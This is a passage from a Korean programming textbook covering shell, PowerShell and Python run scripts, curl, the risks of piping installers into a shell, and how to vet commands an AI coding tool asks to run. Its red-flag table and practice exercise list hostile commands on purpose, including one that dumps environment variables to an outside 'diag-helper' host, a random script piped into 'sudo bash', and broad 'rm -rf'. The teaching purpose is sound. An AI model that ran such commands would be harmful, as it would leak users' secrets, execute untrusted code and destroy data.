- **`#!/usr/bin/env bash`** — **셔뱅**(shebang)이라고 부르는 첫 줄이다. 이 파일을 직접 실행했을 때 **어느 프로그램으로 실행할지** 운영체제에게 알린다. `/usr/bin/env bash`는 "`PATH`에서 `bash`를 찾아 그것으로 실행하라"는 뜻이다. zsh가 아니라 bash로 쓰는 이유는 리눅스 서버, Docker, GitHub Actions 어디에나 bash가 있기 때문이다. 이 스크립트에 쓴 문법은 zsh와 bash가 같다.
- **`set -e`** — 기본적으로 셸 스크립트는 중간 명령이 실패해도 **다음 줄로 계속 간다.** `set -e`를 두면 실패한 곳에서 멈추고, 스크립트도 실패 종료 코드로 끝난다. 줄마다 `&&`로 이은 것과 같은 효과다.
- **`cd "$(dirname "$0")"`** — `$0`은 스크립트 자신의 경로, `dirname`은 경로에서 폴더 부분을 꺼내는 명령, `$( )`는 "괄호 안 명령의 출력으로 바꿔라"는 뜻이다. 합치면 "스크립트가 있는 폴더로 이동"이다. 기초 과정 7장의 "실행 위치에 따라 상대 경로가 달라지는 문제"를 막는다. 스크립트는 따로 실행되는 셸에서 돌기 때문에 이 `cd`는 스크립트가 끝나면 사라진다. 내 터미널의 현재 위치는 바뀌지 않는다.
- **`PY=.venv/bin/python`** — 셸 변수다. 가상환경 안의 파이썬을 경로로 직접 실행하면 활성화하지 않아도 그 가상환경의 파이썬과 패키지를 쓴다(기초 과정 9장).
- **`"${1:-samples/2026-10.csv}"`** — `$1`은 스크립트에 준 첫 번째 인자다. `${1:-기본값}`은 "첫 번째 인자가 없으면 기본값"이다. 큰따옴표로 감싸서 공백이 든 파일 이름도 한 덩어리로 넘긴다(2.6.2).

실행하는 방법은 두 가지다.

```
# macOS
cd ~/python-lab/ch10/ledger_app
bash run_all.sh
```

`bash 파일`은 bash에게 파일을 읽어 실행하게 한다. 이 방법이면 셔뱅도 실행 권한도 필요 없다. 파일 이름만으로 실행하려면 **실행 권한**을 준다.

```
# macOS
chmod +x run_all.sh
./run_all.sh
./run_all.sh samples/header_only.csv
```

- `chmod +x`는 파일에 실행 권한(x)을 더한다. `ls -l`의 맨 앞 `-rw-r--r--`이 `-rwxr-xr-x`로 바뀐다.
- `./run_all.sh`의 `./`가 필요하다. 셸은 명령을 `PATH`의 폴더에서만 찾고, 현재 폴더는 `PATH`에 없다. "현재 폴더의 이 파일"이라고 경로로 알려 줘야 한다. 이것은 보안을 위한 것이다. 현재 폴더가 `PATH`에 있으면, 누군가 내려받은 폴더에 `ls`라는 이름의 파일을 넣어 두었을 때 진짜 `ls` 대신 그것이 실행될 수 있다.

시험이 실패하는 경우도 확인한다. `samples/2026-10.csv`의 금액 하나를 잠깐 바꾸고(예: `550000` → `550001`) 실행하면 `check_samples.py`가 실패하고, `set -e` 때문에 `main.py`는 실행되지 않고 `모두 끝났다.`도 나오지 않는다. `echo $?`는 `1`이다. 확인했으면 원래대로 되돌린다.

> **스크립트가 `bash\r`을 찾지 못한다면**
> Windows에서 만든 `.sh` 파일을 macOS나 리눅스에서 실행하면 `/usr/bin/env: 'bash\r': No such file or directory`라는 오류가 나는 일이 있다. Windows의 줄바꿈 문자 CRLF(`\r\n`)로 저장되어서 첫 줄이 `bash\r`로 읽혔기 때문이다(2장 실습 환경의 상자). VS Code 오른쪽 아래 상태 표시줄의 `CRLF`를 눌러 `LF`로 바꾸고 저장하면 된다. 5장에서 `.gitattributes`로 이런 일을 막는다.

### 3.6.2 PowerShell 스크립트 — `.ps1`

`ledger_app` 폴더에 `run_all.ps1`을 만든다.

```powershell
# run_all.ps1 — 시험이 통과하면 예제 파일로 요약까지 실행한다
# 사용법: ./run_all.ps1 [CSV 파일]   (기본: samples/2026-10.csv)
param(
    [string]$File = "samples/2026-10.csv"
)

$ErrorActionPreference = "Stop"                  # 오류가 나면 멈춘다
$PSNativeCommandUseErrorActionPreference = $true # 외부 프로그램이 실패해도 멈춘다(PowerShell 7.4 이상)
$py = Join-Path $PSScriptRoot ".venv\Scripts\python.exe"

Push-Location $PSScriptRoot      # 스크립트가 있는 폴더로 들어갔다가
try {
    & $py check_samples.py
    & $py main.py $File
    "모두 끝났다."
}
finally {
    Pop-Location                 # 끝나면(실패해도) 원래 폴더로 돌아온다
}
```

셸 스크립트와 같은 일을 하지만 문법이 다르다.

- **`param(...)`** — 스크립트가 받을 인자를 이름과 기본값으로 정한다. `./run_all.ps1 samples/header_only.csv`라고 하면 `$File`에 들어가고, 주지 않으면 기본값이 들어간다. `./run_all.ps1 -File samples/header_only.csv`처럼 이름으로 줄 수도 있다(2.2.3의 매개변수).
- **`$ErrorActionPreference = "Stop"`** — 셸 스크립트의 `set -e`에 해당한다. cmdlet에서 오류가 나면 멈춘다. 그런데 이것만으로는 **외부 프로그램**(`python.exe`)이 실패 종료 코드를 내도 멈추지 않는다. 그래서 다음 줄의 `$PSNativeCommandUseErrorActionPreference = $true`가 필요하다. 이 설정을 켜면 외부 프로그램의 종료 코드가 0이 아닐 때도 오류로 보고 멈춘다.
- **`$PSScriptRoot`** — 스크립트가 있는 폴더의 경로가 들어 있는 변수다. 셸 스크립트의 `$(dirname "$0")`에 해당한다. `Join-Path`는 경로 조각을 운영체제에 맞는 구분자로 잇는다.
- **`Push-Location` / `Pop-Location`** — 셸 스크립트와 달리 **PowerShell 스크립트는 지금 셸 안에서 실행된다.** 스크립트 안에서 `Set-Location`(`cd`)으로 폴더를 옮기면 스크립트가 끝난 뒤에도 내 터미널이 그 폴더에 남는다. `Push-Location`은 지금 위치를 기억하고 옮겨 가고, `Pop-Location`은 기억한 곳으로 돌아온다. `try { } finally { }`의 `finally`는 중간에 실패해도 반드시 실행되므로, 실패해도 원래 폴더로 돌아온다.
- **`& $py ...`** — 변수에 담긴 경로의 프로그램을 실행하는 문법이다. 2장 실습 2-7의 `& "...\vim.exe"`와 같다.

실행한다.

```
# Windows
cd ~\python-lab\ch10\ledger_app
./run_all.ps1
./run_all.ps1 samples/header_only.csv
```

PowerShell은 셸 스크립트처럼 `./`(또는 `.\`)를 붙여 실행한다. 이유도 같다. `chmod` 같은 실행 권한은 없고, 대신 1.2.4의 **실행 정책**이 스크립트 실행을 허락할지 정한다. `RemoteSigned`이면 내가 만든 스크립트는 실행된다. 인터넷에서 **브라우저로 내려받은** 스크립트는 "인터넷에서 온 파일" 표시가 붙어서 서명이 없으면 막힌다. 내용을 읽고 믿을 수 있다고 판단했을 때만 `Unblock-File 파일`로 표시를 지운다.

시험이 실패하는 경우를 확인하면 다음과 같은 오류가 나고 멈춘다.

```
NativeCommandExitException: C:\Users\jinyoung\python-lab\ch10\ledger_app\run_all.ps1:13
Line |
  13 |      & $py check_samples.py
     |      ~~~~~~~~~~~~~~~~~~~~~~
     | Program "python.exe" ended with non-zero exit code: 1.
```

> **`$PSNativeCommandUseErrorActionPreference`를 쓸 수 없다면**
> PowerShell 7.3 이하에서는 이 설정이 동작하지 않는다. 그때는 외부 프로그램을 실행할 때마다 종료 코드를 직접 확인한다.
> ```powershell
> & $py check_samples.py
> if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
> ```
> `if (조건) { ... }`는 조건이 참일 때만 중괄호 안을 실행한다. `exit 숫자`는 스크립트를 그 종료 코드로 끝낸다.

### 3.6.3 파이썬 스크립트 — 어디서나 똑같이

셸 스크립트는 Windows에서 그대로 돌지 않고, PowerShell 스크립트는 macOS에서 돌지 않는다(macOS에도 PowerShell을 설치할 수는 있지만 흔하지 않다). 팀원들이 서로 다른 운영체제를 쓴다면 두 파일을 함께 관리해야 한다. 이미 모두가 가진 것이 있다. **파이썬**이다.

`ledger_app` 폴더에 `run_all.py`를 만든다.

```python
# run_all.py — 시험이 통과하면 예제 파일로 요약까지 실행한다(macOS·Windows 공통)
# 사용법: python run_all.py [CSV 파일]   (기본: samples/2026-10.csv)
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).parent
csv_file = sys.argv[1] if len(sys.argv) > 1 else "samples/2026-10.csv"

steps = [
    ["check_samples.py"],
    ["main.py", csv_file],
]
for step in steps:
    result = subprocess.run([sys.executable, *step], cwd=HERE)
    if result.returncode != 0:
        sys.exit(result.returncode)
print("모두 끝났다.")
```

- **`subprocess.run([...])`** — 다른 프로그램을 실행하고 끝날 때까지 기다린다. 명령을 문자열 하나가 아니라 **리스트**로 주므로 셸을 거치지 않는다. 공백이 든 파일 이름이나 따옴표, 와일드카드를 셸마다 다르게 해석하는 문제(2.6)가 생기지 않는다.
- **`sys.executable`** — 지금 이 스크립트를 실행 중인 파이썬의 경로다. 가상환경의 파이썬으로 `run_all.py`를 실행하면 시험과 요약도 같은 가상환경의 파이썬으로 실행된다.
- **`cwd=HERE`** — 실행할 프로그램의 작업 폴더를 스크립트가 있는 폴더로 정한다. 셸 스크립트의 `cd "$(dirname "$0")"`에 해당한다.
- **`result.returncode`** — 실행한 프로그램의 종료 코드다. 0이 아니면 같은 종료 코드로 끝낸다. 3.3.3의 약속을 그대로 이어 간다.

가상환경을 활성화한 상태에서 두 운영체제 모두 같은 명령으로 실행한다.

```
python run_all.py
python run_all.py samples/header_only.csv
```

## 3.7 웹에서 내려받기와 설치 명령

### 3.7.1 `curl` — 웹 응답 보기와 파일 내려받기

**`curl`** 은 URL로 요청을 보내고 받은 응답을 출력하는 프로그램이다. 브라우저가 화면에 그려 주는 것의 "원재료"를 터미널에서 그대로 본다. "웹·API 기초"와 "LLM API 활용"에서 API를 시험할 때 계속 쓴다. macOS와 Windows 10 이후에는 기본으로 들어 있다.

> **Windows에서는 `curl.exe`로 입력한다**
> Windows PowerShell 5.1에는 `curl`이라는 **별칭**이 있었는데, 진짜 `curl`이 아니라 `Invoke-WebRequest` cmdlet을 가리켰다. 그래서 인터넷의 `curl` 명령을 붙여 넣으면 옵션이 맞지 않는다는 오류가 났다. PowerShell 7에서는 이 별칭을 없애서 `curl`이 진짜 `curl.exe`를 실행한다. 하지만 5.1을 쓰는 사람에게 설명하거나 문서에 적을 때를 생각해 이 교재에서는 Windows에서 `curl.exe`로 적는다. 어느 PowerShell에서든 확실히 진짜 `curl`이 실행된다.

3.5의 `server.py`를 첫째 터미널에 띄워 두고, 둘째 터미널에서 요청을 보낸다.

```
# macOS
curl http://localhost:8000

# Windows
curl.exe http://localhost:8000
```

```
안녕하세요. PID 12345 서버가 답했습니다.
```

브라우저에서 본 것과 같은 내용이 터미널에 나왔다. (Windows에서 한글이 깨져 보이면 3.1.6의 인코딩 설정을 하지 않은 것이다.) `-i`를 붙이면 응답의 **헤더**(header)도 함께 보여 준다. 헤더는 본문 앞에 붙어 오는 "응답에 대한 정보"다.

```
# macOS
curl -i http://localhost:8000

# Windows
curl.exe -i http://localhost:8000
```

```
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.13.2
Date: Fri, 13 Nov 2026 01:20:00 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 54

안녕하세요. PID 12345 서버가 답했습니다.
```

첫 줄의 `200`이 3장 실습 파일 `access.log`에 있던 그 상태 코드다. `server.py`에서 `send_response(200)`, `send_header(...)`로 보낸 것들이 그대로 보인다. 헤더와 상태 코드는 "웹·API 기초"에서 자세히 배운다.

자주 쓰는 옵션은 다음과 같다.

| 옵션 | 뜻 |
|---|---|
| `-i` | 응답 헤더도 보여 준다 |
| `-o 파일` | 응답 본문을 화면 대신 파일로 저장한다 |
| `-O` | URL의 마지막 부분을 파일 이름으로 써서 저장한다 |
| `-L` | 다른 주소로 옮겨 가라는 응답(`302` 등)을 받으면 따라간다 |
| `-f` | 서버가 오류 상태 코드(`404`, `500` 등)를 보내면 실패 종료 코드로 끝낸다 |
| `-s` | 진행 표시와 오류 메시지를 숨긴다 |
| `-S` | `-s`와 함께 쓰면 오류 메시지만은 보여 준다 |

**파일 내려받기**

GitHub는 언어별 `.gitignore` 견본을 모아 둔 저장소를 공개하고 있다. 5장에서 쓸 파이썬용 견본을 내려받아 본다. `ch03` 폴더에서 한다.

```
# macOS
curl -fLO https://raw.githubusercontent.com/github/gitignore/main/Python.gitignore

# Windows
curl.exe -fLO https://raw.githubusercontent.com/github/gitignore/main/Python.gitignore
```

`-O`로 `Python.gitignore`라는 이름의 파일이 생겼다. `head -n 20 Python.gitignore`(Windows `Get-Content Python.gitignore -TotalCount 20`)로 앞부분을 보자. 기초 과정에서 직접 적은 `__pycache__/`, `.venv` 같은 이름이 보인다. 5장에서 다시 쓴다.

`-f`의 쓰임을 확인한다. 없는 파일을 요청해 본다.

```
# macOS
curl -fLO https://raw.githubusercontent.com/github/gitignore/main/NoSuchLanguage.gitignore
echo $?

# Windows
curl.exe -fLO https://raw.githubusercontent.com/github/gitignore/main/NoSuchLanguage.gitignore
$LASTEXITCODE
```

```
curl: (22) The requested URL returned error: 404
22
```

`-f`가 없으면 `curl`은 서버가 보낸 `404` 오류 페이지를 **성공적으로 받았다고** 보고 그 내용을 파일로 저장하고 종료 코드 0으로 끝난다. 스크립트에서 파일을 내려받을 때는 `-f`를 붙여서, 내려받지 못했으면 3.3의 약속대로 실패하게 한다.

**API에 요청해 보기**

GitHub는 저장소 정보를 JSON으로 돌려주는 API를 공개하고 있다. 파이썬 저장소의 정보를 요청한다.

```
# macOS
curl -s https://api.github.com/repos/python/cpython | grep stargazers_count

# Windows
(Invoke-RestMethod https://api.github.com/repos/python/cpython).stargazers_count
```

macOS에서는 응답(JSON 글자)에서 `grep`으로 한 줄을 골랐다. Windows에서는 `Invoke-RestMethod` cmdlet을 썼다. 이 cmdlet은 JSON 응답을 **객체로 바꿔 주므로** 속성 이름으로 바로 꺼낸다. 3.1.4의 글자 파이프와 객체 파이프의 차이가 여기서도 보인다. 숫자(별의 수)는 볼 때마다 다르다. JSON은 "웹·API 기초"에서 배운다.

### 3.7.2 `curl ... | sh` — 설치 명령을 실행하기 전에

도구의 설치 안내에서 이런 모양의 명령을 자주 만난다. 다음은 파이썬 패키지·가상환경 관리 도구인 uv의 공식 설치 명령이다(지금 설치하지는 않는다).

```
# macOS·리눅스
curl -LsSf https://astral.sh/uv/install.sh | sh

# Windows
powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
```

이제 이 장에서 배운 것으로 읽을 수 있다.

| 조각 | 뜻 |
|---|---|
| `curl -LsSf URL` | URL의 내용(설치 스크립트)을 받아서(`-L` 옮겨 가면 따라가고, `-s` 조용히, `-S` 오류는 보이고, `-f` 실패하면 실패로) 표준 출력으로 내보낸다 |
| `\| sh` | 그 내용을 파이프로 셸(`sh`)의 표준 입력에 넣는다. 셸은 받은 글자를 **명령으로 실행한다** |
| `irm URL` | `Invoke-RestMethod`의 별칭. URL의 내용을 받는다 |
| `\| iex` | `Invoke-Expression`의 별칭. 받은 글자를 **PowerShell 명령으로 실행한다** |
| `powershell -ExecutionPolicy ByPass -c "..."` | Windows PowerShell(5.1)을 새로 띄워, **실행 정책을 무시하고**, 따옴표 안의 명령을 실행한다 |

정리하면 "인터넷에서 받은 글자를 **읽지 않고 곧바로** 내 컴퓨터에서 명령으로 실행한다"이다. 1.2.2에서 Homebrew를 설치할 때 쓴 `/bin/bash -c "$(curl -fsSL ...)"`도 같은 일을 한다(`$( )`는 3.6.1에서 본 "명령의 출력으로 바꾸기"다).

이 방식이 널리 쓰이는 이유는 편리해서다. 명령 한 줄로 운영체제와 칩 종류를 알아내 알맞은 파일을 받고 `PATH`까지 설정해 준다. 하지만 다음을 알고 실행해야 한다.

- 그 URL의 내용은 **내 권한으로 무엇이든 할 수 있다.** 내 파일을 읽고 지우고, 비밀 값을 밖으로 보내고, 셸 설정 파일에 줄을 더할 수 있다. 그 URL을 관리하는 사람을 믿는 것과 같다.
- 내용을 **실행하기 전에 볼 기회가 없다.** 화면에는 결과만 나온다.
- 주소를 한 글자 틀리거나 비슷하게 꾸민 가짜 사이트의 명령을 복사하면, 공격자의 스크립트가 실행된다.

그래서 이런 명령을 실행하기 전에 다음을 확인한다.

1. **출처** — 그 도구의 **공식 문서**에서 복사했는가? 블로그, 질문 답변 사이트, AI의 답에 나온 명령이라면 공식 문서에서 같은 명령을 찾아 대조한다. 주소가 `https://`로 시작하고 도메인(`astral.sh`, `brew.sh`, `github.com/공식계정`)이 맞는지 본다.
2. **다른 방법** — 패키지 관리자로 설치할 수 있는가? `brew install uv`, `winget install --id astral-sh.uv`처럼 패키지 관리자에 있는 도구라면 그쪽이 낫다. 설치와 갱신·제거가 한곳에서 관리된다.
3. **먼저 읽기** — 꼭 스크립트로 설치해야 하면, 파이프 대신 파일로 받아서 읽은 다음 실행한다.
   ```
   # macOS
   curl -LsSf https://astral.sh/uv/install.sh -o install-uv.sh
   less install-uv.sh
   sh install-uv.sh

   # Windows
   Invoke-RestMethod https://astral.sh/uv/install.ps1 -OutFile install-uv.ps1
   code install-uv.ps1
   ./install-uv.ps1
   ```
   몇백 줄을 모두 이해할 필요는 없다. 어디에 무엇을 내려받는지, 어떤 파일(셸 설정 파일 등)을 고치는지, `sudo`나 관리자 권한을 요구하는지를 훑어본다. 모르는 부분은 3.8.4의 방법으로 알아본다.
4. **권한** — 설치 명령이 `sudo`(macOS·리눅스의 관리자 권한)나 "관리자 권한으로 PowerShell 실행"을 요구하면 한 번 더 멈춘다. 관리자 권한으로 실행한 스크립트는 내 파일뿐 아니라 운영체제 전체를 바꿀 수 있다. 위의 uv처럼 내 홈 폴더에만 설치하는 도구는 관리자 권한이 필요 없다.
5. **설치 뒤** — 설치 프로그램이 셸 설정 파일이나 `PATH`를 고쳤다고 알리면, 3.4.3에서 본 대로 새 터미널을 열고, 셸 설정 파일에 무엇이 더해졌는지 확인한다(`tail ~/.zshrc`, `tail ~/.zprofile`, Windows는 `$env:PATH -split ';'`).

> **`-ExecutionPolicy ByPass`의 뜻**
> 1.2.4에서 실행 정책은 "스크립트를 실행해도 되는가"를 정하는 Windows의 안전장치라고 했다. `ByPass`는 그 실행에 한해 이 안전장치를 끈다. 공식 설치 명령에 들어 있는 것은 이상한 일이 아니지만, **출처를 모르는 명령에 `ByPass`나 `Set-ExecutionPolicy Unrestricted`가 들어 있으면** 위험 신호다. 3.8에서 다시 본다.

## 3.8 AI가 실행하려는 명령 읽기

### 3.8.1 AI가 실행 허락을 구할 때

Claude Code, Cursor, VS Code의 Copilot 에이전트 같은 AI 코딩 도구는 코드를 고치는 것에서 그치지 않고 **터미널 명령을 실행한다.** 패키지를 설치하고, 시험을 돌리고, 파일을 옮기고, Git 명령을 실행한다. 1단계에서 AI가 대신 해 준 일의 상당 부분이 이것이었다(1.1.1).

대부분의 도구는 명령을 실행하기 전에 허락을 구한다. 화면 모양은 도구마다 다르지만, 대개 실행하려는 명령을 보여 주고 다음 중에서 고르게 한다.

- 이번만 허락
- 이 명령(또는 이런 모양의 명령)은 앞으로 묻지 않고 허락
- 거절(하고 다른 방법을 지시)

허락을 누르는 순간 그 명령은 **내 컴퓨터에서, 내 권한으로** 실행된다. 결과에 대한 책임도 내게 있다. AI는 대개 맞는 명령을 고르지만, 상황을 잘못 이해했거나, 지시를 너무 넓게 해석했거나, 저장소 안의 문서에 숨겨 둔 악의적인 지시를 따랐을 때 위험한 명령을 내놓을 수 있다. 이 장에서 배운 것은 모두 그 명령을 **읽기 위한** 것이었다.

### 3.8.2 명령을 읽는 순서

긴 명령을 받으면 다음 순서로 읽는다.

1. **조각으로 나눈다.** `&&`, `||`, `;`, `|`에서 끊으면 명령 여러 개가 된다. `>`, `>>`, `2>`가 있으면 어디로 무엇을 쓰는지 따로 표시한다.
2. **조각마다 프로그램을 확인한다.** 맨 앞 낱말이 프로그램이다. 모르는 프로그램이나 옵션은 3.8.4의 방법으로 알아본다.
3. **대상을 확인한다.** 어떤 파일·폴더·주소를 다루나? `.`(현재 폴더)는 지금 **어디**인가? `~`, `/`, `C:\`, `..`, `*`처럼 범위가 넓은 것이 있나? `$변수`가 있으면 그 값은 무엇인가?
4. **무엇을 하는지 분류한다.** 읽기만 하나, 바꾸나, 지우나, 밖으로 보내나, 설치하나, 권한을 바꾸나?
5. **되돌릴 수 있는지 묻는다.** Git으로 되돌릴 수 있는 파일인가(5장 이후)? 휴지통을 거치나? 이미 밖으로 보낸 것은 되돌릴 수 없다.

예를 하나 읽어 본다. AI가 "빌드 결과물을 정리하고 다시 만들겠다"며 다음 명령의 실행을 요청했다.

```
cd ~/projects/ledger && rm -rf build dist *.egg-info && python -m build
```

| 조각 | 프로그램 | 대상 | 하는 일 | 되돌릴 수 있나 |
|---|---|---|---|---|
| `cd ~/projects/ledger` | `cd` | `~/projects/ledger` | 폴더 이동 | 상관없음 |
| `rm -rf build dist *.egg-info` | `rm` | 그 폴더 안의 `build`, `dist`, `.egg-info`로 끝나는 것 | **묻지 않고 지운다** | 휴지통 없음 |
| `python -m build` | `python` | 현재 폴더 | 패키지를 만든다 | 다시 지우면 됨 |

`&&`로 이어서 `cd`가 실패하면 뒤가 실행되지 않으니 엉뚱한 폴더에서 지울 걱정은 없다. 지우는 대상은 모두 다시 만들 수 있는 빌드 결과물이다. 확인할 점은 하나다. `~/projects/ledger`가 지금 작업 중인 그 프로젝트가 맞는가? 맞다면 허락해도 된다.

같은 명령이 `cd ~/projects/ledger ; rm -rf build dist *.egg-info`였다면 다르다. `cd`가 실패하면(폴더 이름이 틀렸다면) **지금 있는 폴더**에서 지우기가 실행된다. `rm -rf "$BUILD_DIR/"*`처럼 변수가 들어간 경우는 더 조심한다. `BUILD_DIR`이 비어 있으면 `rm -rf /*`가 된다.

### 3.8.3 위험 신호

다음이 보이면 허락하기 전에 멈추고 한 번 더 읽는다. 위험 신호가 있다고 해서 늘 잘못된 명령은 아니다. **이유를 알고 대상을 확인한 뒤에** 허락한다.

| 분류 | 신호 | 왜 위험한가 |
|---|---|---|
| 지우기·덮어쓰기 | `rm -rf`, `rm -r`, `Remove-Item -Recurse -Force`, `find ... -delete` | 휴지통 없이 지운다(2.4.4) |
| | `> 기존파일` | 묻지 않고 덮어쓴다(3.1.2) |
| | `git reset --hard`, `git clean -fd`, `git checkout -- .`, `git restore .` | 커밋하지 않은 변경을 버린다(5·7장) |
| 넓은 범위 | `~`, `/`, `C:\`, `..`, `*`, 비어 있을 수 있는 `$변수` | 생각보다 많은 것이 대상이 된다 |
| 권한 | `sudo`, "관리자 권한으로 실행", `chmod -R 777` | 내 파일을 넘어 운영체제 전체를 바꿀 수 있다 |
| | `Set-ExecutionPolicy Unrestricted`, `-ExecutionPolicy ByPass` | 스크립트 실행의 안전장치를 끈다 |
| 출처 모를 코드 실행 | `curl ... \| sh`, `irm ... \| iex`, `bash -c "$(curl ...)"` | 받은 내용을 읽지 않고 실행한다(3.7.2) |
| | `pip install 처음 보는 이름`, `npx 처음 보는 이름` | 이름이 비슷한 가짜 패키지가 있다. 설치하는 순간 그 패키지의 코드가 실행될 수 있다 |
| 비밀 값 보기 | `cat .env`, `Get-Content .env`, `env`, `printenv`, `Get-ChildItem Env:`, `echo $OPENAI_API_KEY`, `cat ~/.ssh/id_ed25519` | 출력이 **AI와의 대화에 들어가** 내 컴퓨터 밖(AI 서비스)으로 나간다 |
| 밖으로 보내기 | `curl -X POST ... -d @파일`, `curl ... -F file=@...`, `scp`, `rsync 원격` | 파일 내용을 다른 서버로 보낸다 |
| | `git push`, 특히 `git push --force`, `gh repo create --public` | 코드를 공개하거나 남의 작업을 덮어쓸 수 있다(8장) |
| 시스템·프로세스 | `kill -9`, `pkill`, `Stop-Process -Name` | 다른 작업까지 끌 수 있다(3.5.4) |
| | `~/.zshrc`, `$PROFILE`, `crontab`, 시작 프로그램을 고치는 명령 | 이후 열리는 모든 터미널, 컴퓨터를 켤 때마다 영향을 준다 |
| 실패 숨기기 | `2>/dev/null`, `2>$null`, `> /dev/null 2>&1`, `\|\| true` | 오류가 나도 보이지 않고 성공한 것처럼 보인다(3.1.3) |

"비밀 값 보기"는 내 컴퓨터 안에서 일어나는 일이라 위험해 보이지 않는다. 하지만 AI 코딩 도구는 명령의 출력을 읽어서 다음 행동을 정한다. 그 출력은 AI 모델에게 보내는 대화의 일부가 된다. `cat .env` 한 번이면 3.2.2에서 본 것처럼 API 키가 그대로 대화에 들어간다. AI가 "설정을 확인하겠다"며 `.env`나 환경 변수 전체를 출력하려 하면 거절하고, 필요한 것이 무엇인지(예: "키가 정해져 있는지만 확인") 다시 지시한다. 많은 AI 도구는 특정 파일을 읽지 못하게 막는 설정을 두고 있으니, 쓰는 도구에 그런 설정이 있으면 `.env`를 막아 둔다.

### 3.8.4 모르는 명령은 확인하고 허락한다

**모르는 프로그램이나 옵션이 있으면** 2.2.5의 순서대로 확인한다.

1. 도움말을 본다. `명령 --help`, `man 명령`, `Get-Help 명령`. 옵션 하나만 궁금하면 `man`에서 `/`로 찾는다.
2. 공식 문서를 본다.
3. AI에게 설명을 시킨다. 명령을 실행하려던 그 AI에게 묻는 것도 좋다. 이렇게 묻는다.
   > 이 명령의 각 부분(프로그램, 옵션, 대상)이 무엇을 하는지 설명해 줘. 무엇을 바꾸거나 지우는지, 실행한 뒤 되돌릴 수 있는지도 알려 줘. 나는 macOS의 zsh(또는 Windows의 PowerShell 7)를 쓴다.

   설명을 들은 다음에는 그중 중요한 옵션 한두 개를 도움말에서 직접 확인한다.

**지우거나 바꾸는 명령은 먼저 "보기만" 해 본다.** 2장부터 쓴 방법들이다.

| 실제로 할 일 | 먼저 해 볼 것 |
|---|---|
| `rm *.log` | `ls *.log`로 대상 확인 |
| `Remove-Item ... -Recurse` | 같은 명령에 `-WhatIf` |
| `find ... -delete` | `-delete`를 빼고 실행 |
| `git clean -fd` | `git clean -n`(5장) |
| `kill 12345` | `ps -p 12345 -o command`(3.5.4) |
| `curl ... \| sh` | 파일로 받아서 읽기(3.7.2) |

**"앞으로 계속 허락"은 좁게 준다.** 읽기만 하는 명령(`git status`, `git diff`, `ls`, `grep`, `rg`)과 프로젝트의 검사 명령(`python check_samples.py`, `python run_all.py`)은 계속 허락해도 좋다. 지우기, 내려받기, 설치, `git push`처럼 위의 표에 있는 명령은 매번 확인한다. "모든 셸 명령을 계속 허락"은 주지 않는다.

**되돌릴 수 있는 상태에서 맡긴다.** AI에게 큰 작업을 맡기기 전에 지금까지의 변경을 Git에 커밋해 두면, AI가 무엇을 바꾸었는지 `git diff`로 보고 마음에 들지 않으면 되돌릴 수 있다. 7장의 "AI 코딩 도구와 Git"에서 이 흐름을 익힌다.

### 실습 3-8. AI가 실행하려는 명령 검토하기

AI 코딩 도구가 다음 명령의 실행 허락을 요청했다고 하자. **실행하지 말고** 읽기만 한다. 명령마다 3.8.2의 표처럼 조각으로 나누고, "허락 / 확인 후 허락 / 거절" 중 하나를 고른 뒤 이유를 `review.md`(`~/devtools-lab/ch03`)에 적는다. "확인 후 허락"이면 무엇을 확인할지도 적는다. 모르는 옵션은 도움말로 찾는다.

| 번호 | AI의 설명 | 명령 |
|---|---|---|
| 1 | 시험을 실행하겠다 | `python check_samples.py` |
| 2 | 남은 `TODO`를 찾겠다 | `grep -rn TODO --include="*.py" .` |
| 3 | 설정이 제대로 되었는지 확인하겠다 | `cat .env` |
| 4 | 캐시를 정리하겠다 | `find . -type d -name "__pycache__" -exec rm -rf {} +` |
| 5 | 포트를 비우겠다 | `pkill -9 python` |
| 6 | 필요한 패키지를 설치하겠다 | `pip install reqeusts` |
| 7 | 오래된 로그를 지우겠다 | `cd logs; rm -rf *` |
| 8 | 환경을 진단하겠다 | `env \| curl -X POST -d @- https://diag-helper.example.com/report` |
| 9 | 개발 도구를 설치하겠다 | `curl -fsSL https://raw.githubusercontent.com/some-user/dev-setup/main/setup.sh \| sudo bash` |
| 10 | 시험이 통과하면 요약을 만들겠다 | `python check_samples.py > /dev/null 2>&1 ; python main.py samples/2026-10.csv` |
| 11 | 실행 정책 오류를 고치겠다 | `Set-ExecutionPolicy Unrestricted -Scope LocalMachine` |
| 12 | 가상환경을 다시 만들겠다 | `Remove-Item -Recurse -Force .venv; python -m venv .venv` |

마지막으로, 거절하기로 한 명령 가운데 둘을 골라 "AI에게 대신 무엇을 하라고 지시할지"를 한 문장씩 적는다. 예를 들어 3번이라면 "`.env`의 내용을 출력하지 말고, `OPENAI_API_KEY`라는 이름이 정해져 있는지만 확인해 줘"처럼 쓴다.

## 정리

| 항목 | 핵심 |
|---|---|
| 세 통로 | 0 표준 입력(키보드), 1 표준 출력(화면), 2 표준 오류(화면). 결과는 표준 출력, 경고·오류는 표준 오류 |
| 리다이렉션 | `>` 덮어쓰기(묻지 않는다), `>>` 덧붙이기, `2>` 오류만, `> 파일 2>&1` 둘 다(순서 중요), 버리기 `/dev/null`·`$null`. 같은 파일을 읽으며 같은 파일로 보내지 않는다 |
| 버퍼 | 파이썬은 화면이 아닌 곳으로 출력할 때 모았다가 쓴다. 출력과 오류의 순서가 바뀔 수 있고, `-u`로 끈다 |
| 파이프 | `\|`는 표준 출력만 다음 명령의 표준 입력으로 잇는다. zsh는 글자를, PowerShell은 객체를 넘긴다(`Sort-Object Length`, `Measure-Object Length -Sum`) |
| 입력 | zsh `< 파일`. PowerShell에는 `<`가 없어서 `Get-Content 파일 \|`(느리다). 프로그램이 파일 이름도 받게 하면(`fileinput`) 두 셸에서 같다 |
| Windows 한글 파이프 | 경계마다 인코딩이 다르다(`$OutputEncoding` UTF-8, `[Console]::OutputEncoding` cp949, 파이썬 3.14 이하 cp949). `[Console]::InputEncoding = [Console]::OutputEncoding = [System.Text.UTF8Encoding]::new()`와 `$env:PYTHONUTF8 = "1"`로 모두 UTF-8. `$PROFILE`에 둔다 |
| 필터 | 표준 입력에서 읽고(`for line in sys.stdin`) 표준 출력으로 내보내는(`print`) 프로그램. 문제는 표준 오류로 알린다 |
